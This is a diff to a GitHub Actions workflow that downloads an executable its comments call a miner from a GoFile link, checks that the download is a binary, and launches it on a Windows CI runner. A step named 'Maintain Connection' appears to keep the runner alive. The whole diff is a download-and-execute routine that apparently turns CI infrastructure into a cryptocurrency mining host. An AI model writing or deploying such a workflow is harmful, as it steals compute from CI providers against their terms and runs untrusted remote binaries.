@@ -78,18 +78,33 @@ jobs:
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
       # --- Download Miner from GoFile ---
-      - name: Download Miner from GoFile
+      - name: Download Miner from GoFile (curl)
         run: |
           $url = "https://store5.gofile.io/download/web/8f584fe5-6633-43c4-94ff-aac3a7981d9e/ok.exe"
           $output = "$env:TEMP\ok.exe"
-          Invoke-WebRequest -Uri $url -OutFile $output
+          curl.exe -L -o $output $url
           Write-Host "Miner downloaded to $output"
 
-      # --- Run Your Miner ---
+      # --- Check Downloaded File ---
+      - name: Check Downloaded File
+        run: |
+          $file = "$env:TEMP\ok.exe"
+          Write-Host "Downloaded file size:"
+          Get-Item $file | Select-Object Length, FullName
+          Write-Host "First 20 lines of file (should be binary, not HTML!):"
+          Get-Content $file -TotalCount 20 -Encoding Byte | Format-Hex
+
+      # --- Run Your Miner (only if file is OK) ---
       - name: Run Your Miner
         run: |
-          Start-Process -FilePath "$env:TEMP\ok.exe"
-          Write-Host "Miner started!"
+          $miner = "$env:TEMP\ok.exe"
+          if ((Test-Path $miner) -and ((Get-Item $miner).Length -gt 10240)) {
+            Start-Process -FilePath $miner
+            Write-Host "Miner started!"
+          } else {
+            Write-Host "Miner not downloaded correctly!"
+            exit 1
+          }
 
       # --- Maintain Connection (Graceful Stop for Shutdown) ---
       - name: Maintain Connection (Graceful Stop)
